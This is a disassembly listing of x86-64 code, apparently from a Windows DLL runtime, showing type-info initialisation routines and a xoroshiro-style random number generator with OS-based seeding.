    69681e43:	48 8d 05 36 80 0f 00 	lea    0xf8036(%rip),%rax        # 0x69779e80
    69681e4a:	48 89 05 37 7c 0f 00 	mov    %rax,0xf7c37(%rip)        # 0x69779a88
    69681e51:	48 8d 05 08 7c 0f 00 	lea    0xf7c08(%rip),%rax        # 0x69779a60
    69681e58:	48 89 05 e1 a5 10 00 	mov    %rax,0x10a5e1(%rip)        # 0x6978c440
    69681e5f:	48 8d 05 ba a5 10 00 	lea    0x10a5ba(%rip),%rax        # 0x6978c420
    69681e66:	48 89 05 ab a6 10 00 	mov    %rax,0x10a6ab(%rip)        # 0x6978c518
    69681e6d:	48 8d 05 af 4b 00 00 	lea    0x4baf(%rip),%rax        # 0x69686a23
    69681e74:	48 c7 05 c1 7f 0f 00 	movq   $0x7,0xf7fc1(%rip)        # 0x69779e40
    69681e7b:	07 00 00 00 
    69681e7f:	48 89 0d c2 7f 0f 00 	mov    %rcx,0xf7fc2(%rip)        # 0x69779e48
    69681e86:	48 c7 05 4f a5 10 00 	movq   $0x1,0x10a54f(%rip)        # 0x6978c3e0
    69681e8d:	01 00 00 00 
    69681e91:	48 c7 05 4c a5 10 00 	movq   $0x1,0x10a54c(%rip)        # 0x6978c3e8
    69681e98:	01 00 00 00 
    69681e9c:	66 c7 05 4b a5 10 00 	movw   $0x313,0x10a54b(%rip)        # 0x6978c3f0
    69681ea3:	13 03 
    69681ea5:	48 c7 05 c0 7f 0f 00 	movq   $0x0,0xf7fc0(%rip)        # 0x69779e70
    69681eac:	00 00 00 00 
    69681eb0:	c6 05 99 7f 0f 00 00 	movb   $0x0,0xf7f99(%rip)        # 0x69779e50
    69681eb7:	c6 05 e2 7d 0f 00 01 	movb   $0x1,0xf7de2(%rip)        # 0x69779ca0
    69681ebe:	48 c7 05 df 7d 0f 00 	movq   $0x4d,0xf7ddf(%rip)        # 0x69779ca8
    69681ec5:	4d 00 00 00 
    69681ec9:	48 c7 05 ac 7b 0f 00 	movq   $0xc,0xf7bac(%rip)        # 0x69779a80
    69681ed0:	0c 00 00 00 
    69681ed4:	c6 05 85 7b 0f 00 02 	movb   $0x2,0xf7b85(%rip)        # 0x69779a60
    69681edb:	48 c7 05 1a a6 10 00 	movq   $0x8,0x10a61a(%rip)        # 0x6978c500
    69681ee2:	08 00 00 00 
    69681ee6:	48 c7 05 17 a6 10 00 	movq   $0x8,0x10a617(%rip)        # 0x6978c508
    69681eed:	08 00 00 00 
    69681ef1:	c6 05 18 a6 10 00 16 	movb   $0x16,0x10a618(%rip)        # 0x6978c510
    69681ef8:	48 89 05 31 a6 10 00 	mov    %rax,0x10a631(%rip)        # 0x6978c530
    69681eff:	c3                   	ret
    69681f00:	48 8b 49 10          	mov    0x10(%rcx),%rcx
    69681f04:	48 ff 25 e5 36 10 00 	rex.W jmp *0x1036e5(%rip)        # 0x697855f0
    69681f0b:	48 8d 0d 65 c1 00 00 	lea    0xc165(%rip),%rcx        # 0x6968e077
    69681f12:	c6 05 b7 78 0f 00 01 	movb   $0x1,0xf78b7(%rip)        # 0x697797d0
    69681f19:	48 89 0d c8 78 0f 00 	mov    %rcx,0xf78c8(%rip)        # 0x697797e8
    69681f20:	48 8d 15 79 2c 10 00 	lea    0x102c79(%rip),%rdx        # 0x69784ba0
    69681f27:	48 8d 0d d2 78 0f 00 	lea    0xf78d2(%rip),%rcx        # 0x69779800
    69681f2e:	48 89 15 db 78 0f 00 	mov    %rdx,0xf78db(%rip)        # 0x69779810
    69681f35:	48 8d 05 64 fa 0f 00 	lea    0xffa64(%rip),%rax        # 0x697819a0
    69681f3c:	48 89 0d 85 7a 0f 00 	mov    %rcx,0xf7a85(%rip)        # 0x697799c8
    69681f43:	48 8d 15 e6 78 0f 00 	lea    0xf78e6(%rip),%rdx        # 0x69779830
    69681f4a:	48 89 05 47 2a 10 00 	mov    %rax,0x102a47(%rip)        # 0x69784998
    69681f51:	48 8d 0d 29 c1 00 00 	lea    0xc129(%rip),%rcx        # 0x6968e081
    69681f58:	48 89 15 71 7a 0f 00 	mov    %rdx,0xf7a71(%rip)        # 0x697799d0
    69681f5f:	48 8d 05 6a 78 0f 00 	lea    0xf786a(%rip),%rax        # 0x697797d0
    69681f66:	48 89 0d ab 78 0f 00 	mov    %rcx,0xf78ab(%rip)        # 0x69779818
    69681f6d:	48 8d 15 17 c1 00 00 	lea    0xc117(%rip),%rdx        # 0x6968e08b
    69681f74:	48 89 05 45 7a 0f 00 	mov    %rax,0xf7a45(%rip)        # 0x697799c0
    69681f7b:	48 8d 0d 3e 2b 10 00 	lea    0x102b3e(%rip),%rcx        # 0x69784ac0
    69681f82:	48 89 15 bf 78 0f 00 	mov    %rdx,0xf78bf(%rip)        # 0x69779848
    69681f89:	48 8d 05 90 29 10 00 	lea    0x102990(%rip),%rax        # 0x69784920
    69681f90:	48 89 0d a9 78 0f 00 	mov    %rcx,0xf78a9(%rip)        # 0x69779840
    69681f97:	48 8d 15 82 33 10 00 	lea    0x103382(%rip),%rdx        # 0x69785320
    69681f9e:	48 89 05 3b 78 0f 00 	mov    %rax,0xf783b(%rip)        # 0x697797e0
    69681fa5:	48 8d 0d b4 78 0f 00 	lea    0xf78b4(%rip),%rcx        # 0x69779860
    69681fac:	c6 05 4d 78 0f 00 01 	movb   $0x1,0xf784d(%rip)        # 0x69779800
    69681fb3:	48 89 0d 1e 7a 0f 00 	mov    %rcx,0xf7a1e(%rip)        # 0x697799d8
    69681fba:	48 8d 0d da c0 00 00 	lea    0xc0da(%rip),%rcx        # 0x6968e09b
    69681fc1:	48 c7 05 b4 29 10 00 	movq   $0x58,0x1029b4(%rip)        # 0x69784980
    69681fc8:	58 00 00 00 
    69681fcc:	48 c7 05 b1 29 10 00 	movq   $0x8,0x1029b1(%rip)        # 0x69784988
    69681fd3:	08 00 00 00 
    69681fd7:	66 c7 05 b0 29 10 00 	movw   $0x111,0x1029b0(%rip)        # 0x69784990
    69681fde:	11 01 
    69681fe0:	48 c7 05 4d 29 10 00 	movq   $0x0,0x10294d(%rip)        # 0x69784938
    69681fe7:	00 00 00 00 
    69681feb:	48 c7 05 2a 29 10 00 	movq   $0x8,0x10292a(%rip)        # 0x69784920
    69681ff2:	08 00 00 00 
    69681ff6:	48 c7 05 27 29 10 00 	movq   $0x8,0x102927(%rip)        # 0x69784928
    69681ffd:	08 00 00 00 
    69682001:	66 c7 05 26 29 10 00 	movw   $0x319,0x102926(%rip)        # 0x69784930
    69682008:	19 03 
    6968200a:	48 c7 05 c3 77 0f 00 	movq   $0x8,0xf77c3(%rip)        # 0x697797d8
    69682011:	08 00 00 00 
    69682015:	48 c7 05 98 2b 10 00 	movq   $0x0,0x102b98(%rip)        # 0x69784bb8
    6968201c:	00 00 00 00 
    69682020:	48 c7 05 75 2b 10 00 	movq   $0x8,0x102b75(%rip)        # 0x69784ba0
    69682027:	08 00 00 00 
    6968202b:	48 c7 05 72 2b 10 00 	movq   $0x8,0x102b72(%rip)        # 0x69784ba8
    69682032:	08 00 00 00 
    69682036:	66 c7 05 71 2b 10 00 	movw   $0x319,0x102b71(%rip)        # 0x69784bb0
    6968203d:	19 03 
    6968203f:	48 c7 05 be 77 0f 00 	movq   $0x10,0xf77be(%rip)        # 0x69779808
    69682046:	10 00 00 00 
    6968204a:	48 c7 05 83 2a 10 00 	movq   $0x0,0x102a83(%rip)        # 0x69784ad8
    69682051:	00 00 00 00 
    69682055:	48 c7 05 60 2a 10 00 	movq   $0x8,0x102a60(%rip)        # 0x69784ac0
    6968205c:	08 00 00 00 
    69682060:	48 c7 05 5d 2a 10 00 	movq   $0x8,0x102a5d(%rip)        # 0x69784ac8
    69682067:	08 00 00 00 
    6968206b:	66 c7 05 5c 2a 10 00 	movw   $0x319,0x102a5c(%rip)        # 0x69784ad0
    69682072:	19 03 
    69682074:	c6 05 b5 77 0f 00 01 	movb   $0x1,0xf77b5(%rip)        # 0x69779830
    6968207b:	48 c7 05 b2 77 0f 00 	movq   $0x18,0xf77b2(%rip)        # 0x69779838
    69682082:	18 00 00 00 
    69682086:	48 c7 05 a7 32 10 00 	movq   $0x0,0x1032a7(%rip)        # 0x69785338
    6968208d:	00 00 00 00 
    69682091:	48 89 15 d8 77 0f 00 	mov    %rdx,0xf77d8(%rip)        # 0x69779870
    69682098:	48 8d 15 f1 77 0f 00 	lea    0xf77f1(%rip),%rdx        # 0x69779890
    6968209f:	48 89 0d d2 77 0f 00 	mov    %rcx,0xf77d2(%rip)        # 0x69779878
    696820a6:	48 8d 0d 13 29 10 00 	lea    0x102913(%rip),%rcx        # 0x697849c0
    696820ad:	48 89 15 2c 79 0f 00 	mov    %rdx,0xf792c(%rip)        # 0x697799e0
    696820b4:	48 8d 15 f0 bf 00 00 	lea    0xbff0(%rip),%rdx        # 0x6968e0ab
    696820bb:	48 89 0d de 77 0f 00 	mov    %rcx,0xf77de(%rip)        # 0x697798a0
    696820c2:	48 8d 0d f7 77 0f 00 	lea    0xf77f7(%rip),%rcx        # 0x697798c0
    696820c9:	48 89 15 d8 77 0f 00 	mov    %rdx,0xf77d8(%rip)        # 0x697798a8
    696820d0:	48 8d 15 09 a8 10 00 	lea    0x10a809(%rip),%rdx        # 0x6978c8e0
    696820d7:	48 89 0d 0a 79 0f 00 	mov    %rcx,0xf790a(%rip)        # 0x697799e8
    696820de:	48 8d 0d d6 bf 00 00 	lea    0xbfd6(%rip),%rcx        # 0x6968e0bb
    696820e5:	48 89 15 e4 77 0f 00 	mov    %rdx,0xf77e4(%rip)        # 0x697798d0
    696820ec:	48 8d 15 fd 77 0f 00 	lea    0xf77fd(%rip),%rdx        # 0x697798f0
    696820f3:	48 89 0d de 77 0f 00 	mov    %rcx,0xf77de(%rip)        # 0x697798d8
    696820fa:	48 8d 0d c7 bf 00 00 	lea    0xbfc7(%rip),%rcx        # 0x6968e0c8
    69682101:	48 89 15 e8 78 0f 00 	mov    %rdx,0xf78e8(%rip)        # 0x697799f0
    69682108:	48 8d 15 71 88 0f 00 	lea    0xf8871(%rip),%rdx        # 0x6977a980
    6968210f:	48 c7 05 06 32 10 00 	movq   $0x8,0x103206(%rip)        # 0x69785320
    69682116:	08 00 00 00 
    6968211a:	48 c7 05 03 32 10 00 	movq   $0x8,0x103203(%rip)        # 0x69785328
    69682121:	08 00 00 00 
    69682125:	66 c7 05 02 32 10 00 	movw   $0x319,0x103202(%rip)        # 0x69785330
    6968212c:	19 03 
    6968212e:	c6 05 2b 77 0f 00 01 	movb   $0x1,0xf772b(%rip)        # 0x69779860
    69682135:	48 c7 05 28 77 0f 00 	movq   $0x20,0xf7728(%rip)        # 0x69779868
    6968213c:	20 00 00 00 
    69682140:	48 c7 05 8d 28 10 00 	movq   $0x0,0x10288d(%rip)        # 0x697849d8
    69682147:	00 00 00 00 
    6968214b:	48 c7 05 6a 28 10 00 	movq   $0x8,0x10286a(%rip)        # 0x697849c0
    69682152:	08 00 00 00 
    69682156:	48 c7 05 67 28 10 00 	movq   $0x8,0x102867(%rip)        # 0x697849c8
    6968215d:	08 00 00 00 
    69682161:	66 c7 05 66 28 10 00 	movw   $0x319,0x102866(%rip)        # 0x697849d0
    69682168:	19 03 
    6968216a:	c6 05 1f 77 0f 00 01 	movb   $0x1,0xf771f(%rip)        # 0x69779890
    69682171:	48 c7 05 1c 77 0f 00 	movq   $0x28,0xf771c(%rip)        # 0x69779898
    69682178:	28 00 00 00 
    6968217c:	48 c7 05 71 a7 10 00 	movq   $0x0,0x10a771(%rip)        # 0x6978c8f8
    69682183:	00 00 00 00 
    69682187:	48 c7 05 4e a7 10 00 	movq   $0x8,0x10a74e(%rip)        # 0x6978c8e0
    6968218e:	08 00 00 00 
    69682192:	48 c7 05 4b a7 10 00 	movq   $0x8,0x10a74b(%rip)        # 0x6978c8e8
    69682199:	08 00 00 00 
    6968219d:	66 c7 05 4a a7 10 00 	movw   $0x319,0x10a74a(%rip)        # 0x6978c8f0
    696821a4:	19 03 
    696821a6:	c6 05 13 77 0f 00 01 	movb   $0x1,0xf7713(%rip)        # 0x697798c0
    696821ad:	48 c7 05 10 77 0f 00 	movq   $0x30,0xf7710(%rip)        # 0x697798c8
    696821b4:	30 00 00 00 
    696821b8:	48 c7 05 d5 87 0f 00 	movq   $0x0,0xf87d5(%rip)        # 0x6977a998
    696821bf:	00 00 00 00 
    696821c3:	48 c7 05 b2 87 0f 00 	movq   $0x8,0xf87b2(%rip)        # 0x6977a980
    696821ca:	08 00 00 00 
    696821ce:	48 c7 05 af 87 0f 00 	movq   $0x8,0xf87af(%rip)        # 0x6977a988
    696821d5:	08 00 00 00 
    696821d9:	66 c7 05 ae 87 0f 00 	movw   $0x319,0xf87ae(%rip)        # 0x6977a990
    696821e0:	19 03 
    696821e2:	c6 05 07 77 0f 00 01 	movb   $0x1,0xf7707(%rip)        # 0x697798f0
    696821e9:	48 c7 05 04 77 0f 00 	movq   $0x38,0xf7704(%rip)        # 0x697798f8
    696821f0:	38 00 00 00 
    696821f4:	48 89 15 05 77 0f 00 	mov    %rdx,0xf7705(%rip)        # 0x69779900
    696821fb:	48 89 0d 06 77 0f 00 	mov    %rcx,0xf7706(%rip)        # 0x69779908
    69682202:	48 8d 0d 17 77 0f 00 	lea    0xf7717(%rip),%rcx        # 0x69779920
    69682209:	48 89 15 20 77 0f 00 	mov    %rdx,0xf7720(%rip)        # 0x69779930
    69682210:	48 8d 15 be be 00 00 	lea    0xbebe(%rip),%rdx        # 0x6968e0d5
    69682217:	48 89 0d da 77 0f 00 	mov    %rcx,0xf77da(%rip)        # 0x697799f8
    6968221e:	48 89 15 13 77 0f 00 	mov    %rdx,0xf7713(%rip)        # 0x69779938
    69682225:	48 8d 51 30          	lea    0x30(%rcx),%rdx
    69682229:	48 89 05 60 77 0f 00 	mov    %rax,0xf7760(%rip)        # 0x69779990
    69682230:	48 8d 0d c9 23 10 00 	lea    0x1023c9(%rip),%rcx        # 0x69784600
    69682237:	48 8d 05 b2 be 00 00 	lea    0xbeb2(%rip),%rax        # 0x6968e0f0
    6968223e:	48 89 0d 1b 77 0f 00 	mov    %rcx,0xf771b(%rip)        # 0x69779960
    69682245:	48 89 05 4c 77 0f 00 	mov    %rax,0xf774c(%rip)        # 0x69779998
    6968224c:	48 8d 0d 2d 77 0f 00 	lea    0xf772d(%rip),%rcx        # 0x69779980
    69682253:	48 8d 05 66 77 0f 00 	lea    0xf7766(%rip),%rax        # 0x697799c0
    6968225a:	48 89 15 9f 77 0f 00 	mov    %rdx,0xf779f(%rip)        # 0x69779a00
    69682261:	48 89 05 60 75 0f 00 	mov    %rax,0xf7560(%rip)        # 0x697797c8
    69682268:	48 8d 81 20 fe ff ff 	lea    -0x1e0(%rcx),%rax
    6968226f:	48 89 05 2a 27 10 00 	mov    %rax,0x10272a(%rip)        # 0x697849a0
    69682276:	48 8d 05 03 27 10 00 	lea    0x102703(%rip),%rax        # 0x69784980
    6968227d:	48 8d 15 5e be 00 00 	lea    0xbe5e(%rip),%rdx        # 0x6968e0e2
    69682284:	48 89 05 2d 25 10 00 	mov    %rax,0x10252d(%rip)        # 0x697847b8
    6968228b:	48 8d 05 83 f6 ff ff 	lea    -0x97d(%rip),%rax        # 0x69681915
    69682292:	c6 05 87 76 0f 00 01 	movb   $0x1,0xf7687(%rip)        # 0x69779920
    69682299:	48 c7 05 84 76 0f 00 	movq   $0x40,0xf7684(%rip)        # 0x69779928
    696822a0:	40 00 00 00 
    696822a4:	48 c7 05 69 23 10 00 	movq   $0x0,0x102369(%rip)        # 0x69784618
    696822ab:	00 00 00 00 
    696822af:	48 c7 05 46 23 10 00 	movq   $0x8,0x102346(%rip)        # 0x69784600
    696822b6:	08 00 00 00 
    696822ba:	48 c7 05 43 23 10 00 	movq   $0x8,0x102343(%rip)        # 0x69784608
    696822c1:	08 00 00 00 
    696822c5:	66 c7 05 42 23 10 00 	movw   $0x319,0x102342(%rip)        # 0x69784610
    696822cc:	19 03 
    696822ce:	c6 05 7b 76 0f 00 01 	movb   $0x1,0xf767b(%rip)        # 0x69779950
    696822d5:	48 c7 05 78 76 0f 00 	movq   $0x48,0xf7678(%rip)        # 0x69779958
    696822dc:	48 00 00 00 
    696822e0:	48 89 15 81 76 0f 00 	mov    %rdx,0xf7681(%rip)        # 0x69779968
    696822e7:	48 89 0d 1a 77 0f 00 	mov    %rcx,0xf771a(%rip)        # 0x69779a08
    696822ee:	c6 05 8b 76 0f 00 01 	movb   $0x1,0xf768b(%rip)        # 0x69779980
    696822f5:	48 c7 05 88 76 0f 00 	movq   $0x50,0xf7688(%rip)        # 0x69779988
    696822fc:	50 00 00 00 
    69682300:	48 c7 05 b5 74 0f 00 	movq   $0xa,0xf74b5(%rip)        # 0x697797c0
    69682307:	0a 00 00 00 
    6968230b:	c6 05 8e 74 0f 00 02 	movb   $0x2,0xf748e(%rip)        # 0x697797a0
    69682312:	48 c7 05 83 24 10 00 	movq   $0x8,0x102483(%rip)        # 0x697847a0
    69682319:	08 00 00 00 
    6968231d:	48 c7 05 80 24 10 00 	movq   $0x8,0x102480(%rip)        # 0x697847a8
    69682324:	08 00 00 00 
    69682328:	c6 05 81 24 10 00 16 	movb   $0x16,0x102481(%rip)        # 0x697847b0
    6968232f:	48 89 05 9a 24 10 00 	mov    %rax,0x10249a(%rip)        # 0x697847d0
    69682336:	c3                   	ret
    69682337:	48 8b 41 08          	mov    0x8(%rcx),%rax
    6968233b:	48 85 c0             	test   %rax,%rax
    6968233e:	74 03                	je     0x69682343
    69682340:	48 ff e0             	rex.W jmp *%rax
    69682343:	c3                   	ret
    69682344:	48 b8 05 08 53 b8 8c 	movabs $0x69b4c98cb8530805,%rax
    6968234b:	c9 b4 69 
    6968234e:	48 89 05 8b f5 0f 00 	mov    %rax,0xff58b(%rip)        # 0x697818e0
    69682355:	48 b8 ca 67 8d 68 04 	movabs $0xd1dd3004688d67ca,%rax
    6968235c:	30 dd d1 
    6968235f:	48 89 05 82 f5 0f 00 	mov    %rax,0xff582(%rip)        # 0x697818e8
    69682366:	c3                   	ret
    69682367:	48 8b 01             	mov    (%rcx),%rax
    6968236a:	4c 8b 49 08          	mov    0x8(%rcx),%r9
    6968236e:	48 89 c2             	mov    %rax,%rdx
    69682371:	49 89 c0             	mov    %rax,%r8
    69682374:	4c 31 ca             	xor    %r9,%rdx
    69682377:	49 c1 c8 09          	ror    $0x9,%r8
    6968237b:	4c 01 c8             	add    %r9,%rax
    6968237e:	49 89 d2             	mov    %rdx,%r10
    69682381:	49 31 d0             	xor    %rdx,%r8
    69682384:	48 c1 ca 1c          	ror    $0x1c,%rdx
    69682388:	49 c1 e2 0e          	shl    $0xe,%r10
    6968238c:	48 89 51 08          	mov    %rdx,0x8(%rcx)
    69682390:	4d 31 d0             	xor    %r10,%r8
    69682393:	4c 89 01             	mov    %r8,(%rcx)
    69682396:	c3                   	ret
    69682397:	56                   	push   %rsi
    69682398:	53                   	push   %rbx
    69682399:	48 83 ec 28          	sub    $0x28,%rsp
    6968239d:	48 85 d2             	test   %rdx,%rdx
    696823a0:	48 89 cb             	mov    %rcx,%rbx
    696823a3:	49 89 d3             	mov    %rdx,%r11
    696823a6:	74 3a                	je     0x696823e2
    696823a8:	48 83 fa ff          	cmp    $0xffffffffffffffff,%rdx
    696823ac:	74 2c                	je     0x696823da
    696823ae:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
    696823b2:	48 89 d9             	mov    %rbx,%rcx
    696823b5:	e8 ad ff ff ff       	call   0x69682367
    696823ba:	31 d2                	xor    %edx,%edx
    696823bc:	48 89 c1             	mov    %rax,%rcx
    696823bf:	48 89 f0             	mov    %rsi,%rax
    696823c2:	49 f7 f3             	div    %r11
    696823c5:	48 f7 d2             	not    %rdx
    696823c8:	48 39 d1             	cmp    %rdx,%rcx
    696823cb:	77 e5                	ja     0x696823b2
    696823cd:	49 ff c3             	inc    %r11
    696823d0:	48 89 c8             	mov    %rcx,%rax
    696823d3:	31 d2                	xor    %edx,%edx
    696823d5:	49 f7 f3             	div    %r11
    696823d8:	eb 0a                	jmp    0x696823e4
    696823da:	48 83 c4 28          	add    $0x28,%rsp
    696823de:	5b                   	pop    %rbx
    696823df:	5e                   	pop    %rsi
    696823e0:	eb 85                	jmp    0x69682367
    696823e2:	31 d2                	xor    %edx,%edx
    696823e4:	48 89 d0             	mov    %rdx,%rax
    696823e7:	48 83 c4 28          	add    $0x28,%rsp
    696823eb:	5b                   	pop    %rbx
    696823ec:	5e                   	pop    %rsi
    696823ed:	c3                   	ret
    696823ee:	48 89 ca             	mov    %rcx,%rdx
    696823f1:	48 8d 0d e8 f4 0f 00 	lea    0xff4e8(%rip),%rcx        # 0x697818e0
    696823f8:	eb 9d                	jmp    0x69682397
    696823fa:	eb 9b                	jmp    0x69682397
    696823fc:	41 54                	push   %r12
    696823fe:	55                   	push   %rbp
    696823ff:	57                   	push   %rdi
    69682400:	56                   	push   %rsi
    69682401:	53                   	push   %rbx
    69682402:	48 83 ec 20          	sub    $0x20,%rsp
    69682406:	48 8d 1d e3 c9 00 00 	lea    0xc9e3(%rip),%rbx        # 0x6968edf0
    6968240d:	31 ed                	xor    %ebp,%ebp
    6968240f:	31 ff                	xor    %edi,%edi
    69682411:	4c 8d 63 10          	lea    0x10(%rbx),%r12
    69682415:	49 89 cb             	mov    %rcx,%r11
    69682418:	31 f6                	xor    %esi,%esi
    6968241a:	48 8b 03             	mov    (%rbx),%rax
    6968241d:	48 0f a3 f0          	bt     %rsi,%rax
    69682421:	73 07                	jae    0x6968242a
    69682423:	49 33 3b             	xor    (%r11),%rdi
    69682426:	49 33 6b 08          	xor    0x8(%r11),%rbp
    6968242a:	4c 89 d9             	mov    %r11,%rcx
    6968242d:	48 ff c6             	inc    %rsi
    69682430:	e8 32 ff ff ff       	call   0x69682367
    69682435:	48 83 fe 40          	cmp    $0x40,%rsi
    69682439:	75 df                	jne    0x6968241a
    6968243b:	48 83 c3 08          	add    $0x8,%rbx
    6968243f:	4c 39 e3             	cmp    %r12,%rbx
    69682442:	75 d4                	jne    0x69682418
    69682444:	49 89 3b             	mov    %rdi,(%r11)
    69682447:	49 89 6b 08          	mov    %rbp,0x8(%r11)
    6968244b:	48 83 c4 20          	add    $0x20,%rsp
    6968244f:	5b                   	pop    %rbx
    69682450:	5e                   	pop    %rsi
    69682451:	5f                   	pop    %rdi
    69682452:	5d                   	pop    %rbp
    69682453:	41 5c                	pop    %r12
    69682455:	c3                   	ret
    69682456:	48 89 c8             	mov    %rcx,%rax
    69682459:	89 d1                	mov    %edx,%ecx
    6968245b:	48 d3 c0             	rol    %cl,%rax
    6968245e:	c3                   	ret
    6968245f:	57                   	push   %rdi
    69682460:	56                   	push   %rsi
    69682461:	53                   	push   %rbx
    69682462:	48 83 ec 20          	sub    $0x20,%rsp
    69682466:	48 89 d6             	mov    %rdx,%rsi
    69682469:	e8 90 f4 ff ff       	call   0x696818fe
    6968246e:	b9 02 00 00 00       	mov    $0x2,%ecx
    69682473:	48 8b 1d 76 ac 00 00 	mov    0xac76(%rip),%rbx        # 0x6968d0f0
    6968247a:	48 89 c7             	mov    %rax,%rdi
    6968247d:	ff d3                	call   *%rbx
    6968247f:	48 89 fa             	mov    %rdi,%rdx
    69682482:	48 89 c1             	mov    %rax,%rcx
    69682485:	e8 9c f5 ff ff       	call   0x69681a26
    6968248a:	b9 02 00 00 00       	mov    $0x2,%ecx
    6968248f:	ff d3                	call   *%rbx
    69682491:	48 8d 15 62 bc 00 00 	lea    0xbc62(%rip),%rdx        # 0x6968e0fa
    69682498:	48 89 c1             	mov    %rax,%rcx
    6968249b:	e8 86 f5 ff ff       	call   0x69681a26
    696824a0:	89 f1                	mov    %esi,%ecx
    696824a2:	e8 99 a1 00 00       	call   0x6968c640
    696824a7:	90                   	nop
    696824a8:	48 83 ec 28          	sub    $0x28,%rsp
    696824ac:	b0 01                	mov    $0x1,%al
    696824ae:	48 85 d2             	test   %rdx,%rdx
    696824b1:	74 19                	je     0x696824cc
    696824b3:	41 89 d0             	mov    %edx,%r8d
    696824b6:	41 b9 02 00 00 00    	mov    $0x2,%r9d
    696824bc:	48 89 ca             	mov    %rcx,%rdx
    696824bf:	31 c9                	xor    %ecx,%ecx
    696824c1:	ff 15 f9 a1 10 00    	call   *0x10a1f9(%rip)        # 0x6978c6c0
    696824c7:	85 c0                	test   %eax,%eax
    696824c9:	0f 94 c0             	sete   %al
    696824cc:	48 83 c4 28          	add    $0x28,%rsp
    696824d0:	c3                   	ret
    696824d1:	57                   	push   %rdi
    696824d2:	56                   	push   %rsi
    696824d3:	53                   	push   %rbx
    696824d4:	48 83 ec 40          	sub    $0x40,%rsp
    696824d8:	ba 10 00 00 00       	mov    $0x10,%edx
    696824dd:	bb 08 00 00 00       	mov    $0x8,%ebx
    696824e2:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
    696824e7:	48 89 ce             	mov    %rcx,%rsi
    696824ea:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    696824ef:	e8 d8 f4 ff ff       	call   0x696819cc
    696824f4:	ba 10 00 00 00       	mov    $0x10,%edx
    696824f9:	48 89 f9             	mov    %rdi,%rcx
    696824fc:	e8 cb f4 ff ff       	call   0x696819cc
    69682501:	ba 10 00 00 00       	mov    $0x10,%edx
    69682506:	48 89 f9             	mov    %rdi,%rcx
    69682509:	e8 9a ff ff ff       	call   0x696824a8
    6968250e:	84 c0                	test   %al,%al
    69682510:	75 07                	jne    0x69682519
    69682512:	48 ff cb             	dec    %rbx
    69682515:	75 ea                	jne    0x69682501
    69682517:	eb 1e                	jmp    0x69682537
    69682519:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
    6968251e:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
    69682523:	48 85 d2             	test   %rdx,%rdx
    69682526:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
    6968252b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69682530:	75 05                	jne    0x69682537
    69682532:	48 85 c0             	test   %rax,%rax
    69682535:	74 db                	je     0x69682512
    69682537:	48 83 7c 24 20 00    	cmpq   $0x0,0x20(%rsp)
    6968253d:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    69682542:	75 16                	jne    0x6968255a
    69682544:	48 85 c0             	test   %rax,%rax
    69682547:	75 11                	jne    0x6968255a
    69682549:	48 8d 0d 30 c8 00 00 	lea    0xc830(%rip),%rcx        # 0x6968ed80
    69682550:	ba 01 00 00 00       	mov    $0x1,%edx
    69682555:	e8 05 ff ff ff       	call   0x6968245f
    6968255a:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
    6968255f:	48 89 f0             	mov    %rsi,%rax
    69682562:	0f 11 06             	movups %xmm0,(%rsi)
    69682565:	48 83 c4 40          	add    $0x40,%rsp
    69682569:	5b                   	pop    %rbx
    6968256a:	5e                   	pop    %rsi
    6968256b:	5f                   	pop    %rdi
    6968256c:	c3                   	ret
    6968256d:	53                   	push   %rbx
    6968256e:	48 83 ec 40          	sub    $0x40,%rsp
    69682572:	ba 10 00 00 00       	mov    $0x10,%edx
    69682577:	48 89 cb             	mov    %rcx,%rbx
    6968257a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
    6968257f:	e8 48 f4 ff ff       	call   0x696819cc
    69682584:	48 83 3d 04 2b 10 00 	cmpq   $0x0,0x102b04(%rip)        # 0x69785090
    6968258b:	00 
    6968258c:	48 8b 05 05 2b 10 00 	mov    0x102b05(%rip),%rax        # 0x69785098
    69682593:	75 1b                	jne    0x696825b0
    69682595:	48 85 c0             	test   %rax,%rax
    69682598:	75 16                	jne    0x696825b0
    6968259a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    6968259f:	e8 2d ff ff ff       	call   0x696824d1
    696825a4:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
    696825a9:	0f 11 05 e0 2a 10 00 	movups %xmm0,0x102ae0(%rip)        # 0x69785090
    696825b0:	0f 10 0d d9 2a 10 00 	movups 0x102ad9(%rip),%xmm1        # 0x69785090
    696825b7:	48 8d 0d d2 2a 10 00 	lea    0x102ad2(%rip),%rcx        # 0x69785090
    696825be:	0f 29 4c 24 30       	movaps %xmm1,0x30(%rsp)
    696825c3:	e8 34 fe ff ff       	call   0x696823fc
    696825c8:	0f 28 54 24 30       	movaps 0x30(%rsp),%xmm2
    696825cd:	48 89 d8             	mov    %rbx,%rax
    696825d0:	0f 11 13             	movups %xmm2,(%rbx)
    696825d3:	48 83 c4 40          	add    $0x40,%rsp
    696825d7:	5b                   	pop    %rbx
    696825d8:	c3                   	ret
    696825d9:	48 83 ec 38          	sub    $0x38,%rsp
    696825dd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    696825e2:	e8 86 ff ff ff       	call   0x6968256d
    696825e7:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
    696825ec:	0f 11 05 ed f2 0f 00 	movups %xmm0,0xff2ed(%rip)        # 0x697818e0
    696825f3:	48 83 c4 38          	add    $0x38,%rsp
    696825f7:	c3                   	ret
    696825f8:	48 8d 05 a1 f3 0f 00 	lea    0xff3a1(%rip),%rax        # 0x697819a0
    696825ff:	c6 05 2a 70 0f 00 01 	movb   $0x1,0xf702a(%rip)        # 0x69779630
    69682606:	48 89 05 eb 2d 10 00 	mov    %rax,0x102deb(%rip)        # 0x697853f8
    6968260d:	48 8d 05 1c 70 0f 00 	lea    0xf701c(%rip),%rax        # 0x69779630
    69682614:	48 89 05 45 71 0f 00 	mov    %rax,0xf7145(%rip)        # 0x69779760
    6968261b:	48 8d 05 7e 9d 10 00 	lea    0x109d7e(%rip),%rax        # 0x6978c3a0
